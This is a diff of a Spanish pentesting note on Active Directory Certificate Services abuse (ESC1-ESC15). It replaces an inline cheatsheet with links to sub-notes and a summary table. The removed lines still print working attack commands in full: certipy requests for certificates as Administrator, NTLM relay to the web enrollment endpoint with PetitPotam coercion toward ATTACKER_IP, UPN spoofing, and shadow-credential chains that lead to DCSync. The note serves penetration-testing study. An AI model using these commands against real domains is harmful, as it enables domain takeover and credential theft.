@@ -5,7 +5,6 @@ aliases:
   - "Reading .PFX File"
   - Active Directory Certificate Services Abuse
   - ADCS Abuse
-  - Certipy
   - ESC1-ESC15
 tags:
   - technique/privilege-escalation
@@ -19,230 +18,112 @@ secondary categories:
   - "[[Explotación]]"
 tertiary categories:
   - "[[Active Directory]]"
-kind: Technique
+kind: CheatSheet
 linked:
-  - "[[Active Directory Explotación]]"
-  - "[[Windows Privilege Escalation]]"
-  - "[[Certipy]]"
+  - "[[AD CS Abuse - Descubrimiento]]"
+  - "[[AD CS Abuse - Template ESCs]]"
+  - "[[AD CS Abuse - CA y Relay ESCs]]"
+  - "[[AD CS Abuse - Mapping ESCs]]"
+  - "[[AD CS Abuse - Tooling]]"
+  - "[[Certifried (CVE-2022-26923)]]"
   - "[[Shadow Credentials]]"
-  - "[[NTLM Relay]]"
+  - "[[UnPAC-the-hash]]"
 ---
 # AD CS Abuse
+
+Abuso de **Active Directory Certificate Services**. Plantillas o CAs mal configuradas permiten que un usuario común obtenga un certificado que **autentica como cualquier identidad** (incluido un DA), o que la CA emita certs bajo coerción/relay. Las misconfiguraciones se catalogan como **ESC1-ESC15**. El cert obtenido se convierte en TGT + NT hash vía [[UnPAC-the-hash]].
 
 ---
 
 ## Cheatsheet
-^adcs-abuse
 
-| ESC | Misconfig | Impacto | Tool |
-| --- | --- | --- | --- |
-| **ESC1** | SAN + Client Auth + enroll right | Cert como cualquier user | `certipy req` |
-| **ESC2** | Any Purpose EKU + enroll | Cert arbitrario | `certipy req` |
-| **ESC3** | Enrollment Agent + enroll on behalf | Cert como cualquier user | `certipy req -on-behalf-of` |
-| **ESC4** | WriteProperty sobre template | Convertir template en ESC1 | `certipy template` |
-| **ESC5** | Control sobre CA / PKI object | Full ADCS compromise | Varios |
-| **ESC6** | `EDITF_ATTRIBUTESUBJECTALTNAME2` en CA | SAN injection en request | `certipy req -upn` |
-| **ESC7** | `ManageCA` / `ManageCertificates` | Aprobar request pendiente | `certipy ca` |
-| **ESC8** | HTTP enrollment sin signing | Relay NTLM → cert DA | `ntlmrelayx --adcs` |
-| **ESC9** | `no-security-extension` flag | Cert de otro user con UPN | `certipy req -upn target@...` |
-| **ESC10** | `StrongCertificateBindingEnforcement=0` | Cert con UPN de otro user | Como ESC9 |
-| **ESC11** | IF_ENFORCEENCRYPTICERTREQUEST off en RPC | Relay a RPC CA endpoint | `ntlmrelayx -icpr` |
-| **ESC13** | Cert policy mapping → AD group | Cert user → membership elevada | `certipy req` |
-| **ESC14** | WeakExplicitMapping / altSecurityIdentities | Editar mapping → cert arbitrario | `certipy` |
-| **ESC15** | v1 template + Client Auth | Inyección SAN en template v1 | `certipy req -application-policies` |
+### 1. Descubrimiento
 
----
+````tabs
+tab: **Enum CAs y Templates**
+![[AD CS Abuse - Descubrimiento#^adcs-disco]]
+````
 
-## Descubrimiento
+### 2. Template ESCs (ESC1-4)
 
-### Certipy (Linux)
-```bash
-# Enum vulnerable templates + CAs
-certipy find -u user@dom.local -p pass -dc-ip DC -vulnerable -stdout
+````tabs
+tab: **ESC1 — SAN + Client Auth**
+![[AD CS Abuse - Template ESCs#^adcs-esc1]]
 
-# Zip + json output
-certipy find -u user@dom.local -p pass -dc-ip DC -vulnerable -enabled
+tab: **ESC2 — Any Purpose**
+![[AD CS Abuse - Template ESCs#^adcs-esc2]]
 
-# Con hash
-certipy find -u user -hashes :NTHASH -dc-ip DC -vulnerable
+tab: **ESC3 — Enrollment Agent**
+![[AD CS Abuse - Template ESCs#^adcs-esc3]]
 
-# Con ticket
-certipy find -u user -k -no-pass -target DC.dom.local -dc-ip DC
-```
+tab: **ESC4 — WriteProperty**
+![[AD CS Abuse - Template ESCs#^adcs-esc4]]
+````
 
-### Certify (Windows)
-```powershell
-.\Certify.exe find /vulnerable
-.\Certify.exe find /vulnerable /currentuser
-```
+### 3. CA y Relay ESCs (ESC6-8, 11)
 
-### PSPKIAudit
-```powershell
-Invoke-PKIAudit
-```
+````tabs
+tab: **ESC6 — SAN flag en CA**
+![[AD CS Abuse - CA y Relay ESCs#^adcs-esc6]]
 
-## ESC1 — SAN + Client Auth + enroll right
+tab: **ESC7 — ManageCA**
+![[AD CS Abuse - CA y Relay ESCs#^adcs-esc7]]
 
-Template permite:
-- Client Authentication EKU.
-- Subject Alternative Name (SAN) especificado por requestor.
-- Low-priv user enroll permitido.
+tab: **ESC8 — Web Enrollment Relay**
+![[AD CS Abuse - CA y Relay ESCs#^adcs-esc8]]
 
-### Explotación
-```bash
-# Request cert como Administrator
-certipy req -u user@dom.local -p pass -ca CA-NAME -template VulnTemplate -upn administrator@dom.local -dc-ip DC
+tab: **ESC11 — RPC Relay**
+![[AD CS Abuse - CA y Relay ESCs#^adcs-esc11]]
+````
 
-# Resultado: administrator.pfx
-# Autenticarse
-certipy auth -pfx administrator.pfx -dc-ip DC
-# → NT hash de administrator
-```
+### 4. Mapping ESCs (ESC9-15)
 
-## ESC2 — Any Purpose EKU
+````tabs
+tab: **ESC9/10 — UPN Spoofing**
+![[AD CS Abuse - Mapping ESCs#^adcs-esc9-10]]
 
-Template con `Any Purpose` (OID 2.5.29.37.0) o sin EKU → cert para todo.
+tab: **ESC13 — Policy OID → Group**
+![[AD CS Abuse - Mapping ESCs#^adcs-esc13]]
 
-```bash
-certipy req -u user@dom.local -p pass -ca CA -template AnyPurposeTemplate
-# Usar para client auth, code signing, etc.
-```
+tab: **ESC15 — v1 Template (EKUwu)**
+![[AD CS Abuse - Mapping ESCs#^adcs-esc15]]
+````
 
-## ESC3 — Enrollment Agent
+### 5. Tooling
 
-Cert con EKU `Certificate Request Agent` permite solicitar certs on-behalf.
-
-```bash
-# 1. Obtener cert agent
-certipy req -u user -p pass -ca CA -template EnrollmentAgentTemplate
-
-# 2. Usar para request on-behalf-of
-certipy req -u user -p pass -ca CA -template User -on-behalf-of 'dom\administrator' -pfx agent.pfx
-```
-
-## ESC4 — WriteProperty sobre template
-
-Control sobre template → reconfigurar para cumplir ESC1.
-
-```bash
-# Salvar config original
-certipy template -u user -p pass -template VulnTemplate -save-old
-
-# Modificar a ESC1-like
-certipy template -u user -p pass -template VulnTemplate -dc-ip DC
-
-# Explotar ESC1
-certipy req -u user -p pass -ca CA -template VulnTemplate -upn administrator@dom.local
-
-# Restaurar
-certipy template -u user -p pass -template VulnTemplate -configuration VulnTemplate.json
-```
-
-## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
-
-CA permite SAN en request sobre **cualquier template** (flag deprecated pero aún visto).
-
-```bash
-certipy req -u user -p pass -ca CA -template User -upn administrator@dom.local
-```
-
-## ESC7 — ManageCA / ManageCertificates
-
-```bash
-# Aprobar request previamente denegado
-certipy ca -u user -p pass -ca CA -issue-request REQUEST_ID
-
-# Agregar officer right y template SubCA
-certipy ca -u user -p pass -ca CA -add-officer user
-certipy ca -u user -p pass -ca CA -enable-template SubCA
-```
-
-## ESC8 — HTTP Web Enrollment + NTLM Relay
-
-Web enrollment endpoint (`/certsrv/`) sin HTTPS/EPA → relay NTLM.
-
-```bash
-# Coercion + relay
-ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
-
-# En otra terminal
-PetitPotam.py -u '' -p '' ATTACKER_IP DC
-# o
-coercer coerce -t DC -l ATTACKER -u '' -p ''
-```
-
-Resultado: cert del DC (si template `DomainController`). Usar con S4U para impersonar DA:
-
-```bash
-certipy auth -pfx dc.pfx -dc-ip DC
-# → hash de la cuenta DC$, usable para DCSync via S4U
-```
-
-## ESC9 / ESC10 — UPN spoofing
-
-Certs no validan `objectSID` (fix: `StrongCertificateBindingEnforcement` KB5014754).
-
-```bash
-# Cambiar UPN de user con WriteProperty
-certipy account update -u attacker -p pass -user victim -upn administrator
-
-# Request cert (aparece como administrator)
-certipy req -u victim -p vpass -ca CA -template Template
-
-# Auth → hash de administrator
-certipy auth -pfx victim.pfx -dc-ip DC
-```
-
-## ESC11 — RPC enrollment sin signing
-
-```bash
-ntlmrelayx.py -t rpc://CA -rpc-mode ICPR -icpr-ca-name CA -smb2support
-```
-
-## ESC13 — Policy OID → AD group
-
-Cert con OID mapeado a grupo privilegiado (via `msDS-OIDToGroupLink`).
-
-```bash
-certipy req -u user -p pass -ca CA -template ESC13Template
-# Cert resultante → membership efectivo del grupo linkeado
-```
-
-## ESC15 — v1 template + Client Auth (CVE-2024-49019 EKUwu)
-
-Templates v1 con Client Auth EKU permiten inyección de application policies.
-
-```bash
-certipy req -u user -p pass -ca CA -template WebServer -upn administrator@dom.local -application-policies 'Client Authentication'
-```
+````tabs
+tab: **Herramientas**
+![[AD CS Abuse - Tooling#^adcs-tooling]]
+````
 
 ---
 
-## Cadena Shadow Credentials + ADCS
+## Overview
 
-Con `GenericWrite` sobre computer account:
+| ESC | Misconfig | Impacto |
+|:---:|:---|:---|
+| **ESC1** | SAN + Client Auth + enroll | Cert como cualquier user |
+| **ESC2** | Any Purpose EKU | Cert arbitrario |
+| **ESC3** | Enrollment Agent | Cert on-behalf-of |
+| **ESC4** | WriteProperty sobre template | Convertir en ESC1 |
+| **ESC5** | Control sobre objeto PKI/CA | Compromiso ADCS completo |
+| **ESC6** | `EDITF_ATTRIBUTESUBJECTALTNAME2` | SAN injection en cualquier template |
+| **ESC7** | `ManageCA`/`ManageCertificates` | Aprobar requests, habilitar templates |
+| **ESC8** | Web enrollment sin signing | Relay NTLM → cert DA |
+| **ESC9/10** | Mapeo débil (no SID) | Cert con UPN de otro user |
+| **ESC11** | RPC sin encryption | Relay a RPC CA |
+| **ESC13** | Policy OID → AD group | Cert otorga membership |
+| **ESC15** | v1 template + Client Auth (EKUwu) | SAN injection (CVE-2024-49019) |
 
-```bash
-# Shadow cred (setear msDS-KeyCredentialLink)
-certipy shadow auto -u attacker -p pass -account TARGET$ -dc-ip DC
+**Flujo general:** `certipy find -vulnerable` → identificar el ESC → pedir el cert (`certipy req`) → autenticar (`certipy auth`) → TGT + NT hash → DCSync / PtH. ESC8/11 usan relay+coerción en vez de enroll directo.
 
-# Auth como computer
-certipy auth -pfx TARGET.pfx -dc-ip DC
-# → TGT + NT hash de TARGET$
-```
+> [!tip] Relacionadas
+> Machine account → cert de DA sin template vulnerable: [[Certifried (CVE-2022-26923)]]. Robo de la CA key para forjar offline: [[Golden Certificate]].
 
-## Tools
-
-- **Certipy** (`ly4k/Certipy`) — swiss-army Linux.
-- **Certify** (`GhostPack/Certify`) — on-host Windows enum + request.
-- **PSPKIAudit** — audit defensivo/ofensivo.
-- **ntlmrelayx.py** con `--adcs` — ESC8/ESC11.
+---
 
 ## Recursos
 
-- [SpecterOps - Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) — paper original.
-- [Certipy Wiki](https://github.com/ly4k/Certipy)
-- [HackTricks - ADCS](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates)
-- [The Hacker Recipes - ADCS](https://www.thehacker.recipes/ad/movement/ad-cs)
-
----
+- [SpecterOps — Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) — paper original (ESC1-8).
+- [ly4k/Certipy](https://github.com/ly4k/Certipy) — herramienta + wiki (ESC9-15).
+- [The Hacker Recipes — AD CS](https://www.thehacker.recipes/ad/movement/ad-cs)
